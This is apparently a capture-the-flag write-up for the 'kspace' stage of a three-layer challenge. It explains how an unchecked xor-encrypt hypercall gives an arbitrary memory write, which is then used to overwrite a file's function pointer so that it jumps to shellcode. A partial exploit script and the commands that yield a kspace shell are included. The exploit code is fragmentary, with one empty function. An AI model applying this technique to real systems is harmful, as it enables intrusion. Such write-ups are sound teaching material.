The goal is to get &#8220;kspace&#8221; flag by exploiting the kernel space process.

Before we dive in, let's look at what is really going on.

We can think of each process (tz, kspace, uspace) as a separate privilege ring, as their name suggest.

  * **tz** (TrustZone?) &#8211; a &#8220;hypervisor&#8221; layer that implements the &#8220;hypercalls&#8221; (we haven&#8217;t really reversed this too much).
  * **kspace** &#8211; a kernel layer that implements the &#8220;syscalls&#8221;; it maintains the files array and performs the actual tasks such as listing files, removing files, sleeping, and cat&#8217;ing (open & read).
  * **uspace** &#8211; a user layer that implements the interface that the user interacts with; it parses the commands and calls the appropriate &#8220;syscalls&#8221;.

We would start from the **uspace** to get an arbitrary code execution on **uspace** process (as we did in previous write-up), then exploit the **kspace** to allow us to perform an attack against **tz**. Shared memory is arranged by **tz**, such that each layer will get its own memory &#8220;space&#8221; to pass the arguments to {sys, hyper}calls.

We can see that the syscall numbers, which is stored on **user_space[0]**, match with what we saw on **uspace**.

  * **do_ls** loops through the **file_array** list and prints out the name of the file.
  * **do_rm** finds the file in **file_array** with a given filename, and deletes it.
  * **do_create** adds a file into **file_array** up to 16 files. It looks for the spot/bin in the array by checking if the filename is null.  
    This also initializes the file structure:
      * **open_file**, **read_file**, and **delete_file** are the function pointers.  
        * Note that **syscall 95** and **99** are **sleep** and **exit**, respectively, which are not that interesting :p
        * **do_read** finds the file in **file_array** with a given filename, and if the file is &#8220;open&#8221;, its content is copied to the output buffer (2nd argument).
        * **do_open** finds the file in **file_array** with a given filename, and changes its open state. 
            * Only up to 9 files can be open simultaneously.

There is a bug with file creation and deletion, where the number of files in the list gets incremented when creating a file, but it does not get decremented when being deleted. Thus, we can only create up to 16 files and we can&#8217;t create any more file even if we delete some. This didn&#8217;t really affect the exploitation, however :)

If you followed carefully, you&#8217;d have noticed that we didn&#8217;t go over the mysterious **syscall 92** (sub_402380).

This operation, unlike other ones, does not process the user input/arguments here. Instead, it forwards these arguments to **tz** via the &#8220;hypercall&#8221;.

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_2.png" lightbox="quincy-adams" title="syscall 92 (kspace)" %}

To be more precise, the 3 arguments are stored starting at **kernel_space + 48**, and the hypercall takes 3 arguments of the **hypercall number (92)**, ****, and the **pointer to the arguments (kernel_space + 48)**.

So what does this hypercall do? Let&#8217;s take a look at **tz** binary now.

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" lightbox="quincy-adams" title="hypercall handler (tz)" %}

As we can see above, **sub_401560** is the hypercall 92 handler.  
It doesn&#8217;t really do anything too fancy. The function performs a very simple &#8220;encryption&#8221; of data.

It basically **xor**'s the bytes at **src** with the **key** &#8220;charlestown isn&#8217;t that skeytchy.&#8221; and stores the result to **dest**.

There is no restriction on the memory address for **dest** (other than checking if it&#8217;s 0x100000000), which allows us to do <span style="text-decoration: underline;">arbitrary (xor) write</span>. By preparing the **src** buffer with already xor&#8217;d values, we can write any value we want to any memory location.

So, we can use this capability(?) to write useful data structure (such as a function pointer) to gain arbitrary code execution!

Just like **uspace**, **kspace** has NX disabled, so we can put our shellcode somewhere and jump to it.

&nbsp;

The attack plan is as follows:

  1. Create a file, with the content being the shellcode we want to run as kernel.
  2. Overwrite a function pointer (open_file) for the first file (which is the one that we just created in step 1) with the pointer to our shellcode. 
      * The **file_array** is located at kernel_space + 0x3E800 == **0x90003e800**.
      * According to our **struc_files** struct, file_array **+ 0x8** points to the **files** array.
      * Thus, the first file structure will be located at **0x90003e808** and according to our **struc_file**, its content is located at the offset **+0x9**.
      * The first file&#8217;s content == **shellcode** == 0x90003e800 + 0x8 + 0x9 == **0x90003e811**.
      * The first file&#8217;s **open_file** function pointer is at **+0x118** from the file structure, which makes its location **0x90003e920**.
  3. Invoke a syscall #93, which opens a file. 
      * At this point, we will tell it to open our file which has corrupted **open_file** function pointer &#8212; thus, calling into our shellcode.

Note that since we are using syscal #92 (encrypt) to perform an arbitrary write to memory, we have to &#8220;encrypt&#8221; the value we want to write beforehand such that it will get &#8220;decrypted&#8221; when it writes. The filename we used is &#8220;lol&#8221;.

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):

f = open('payload', 'wb')

f.write('create lol\n'.ljust(0x400, '#'))
f.write(open('shell.bin').read().ljust(0x100, '\0'))

pop_pop_ret = 0x40110F
stage1 = open('stage1.bin').read()

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))
{% endhighlight %}
<br />

Our exploit code looks fairly similar, but we now create a file called &#8216;lol&#8217; first with the shellcode. (The shellcode is the same as what we used for uspace.)

Then, we trigger the bug with our stage1 code.

<p class="filename">Pwn!</p>
{% highlight bash %}
$ nasm shell.asm -f bin -o shell.bin
$ nasm stage1.asm -f bin -o stage1.bin
$ python pwn_kspace.py
$ (cat ../kspace/payload; cat -) | sudo ./tz
bksh> bksh> bksh>
whoami
kspace
{% endhighlight %}
<br />

So far, we have triggered a **uspace** bug to call a syscall (92) in **kspace**, which does a hypercall (92) in **tz**, which allowed us to perform an arbitrary memory write in **kspace **memory.

Amusingly, we will be using the same primitive to get a shell under **tz** context in the next series.
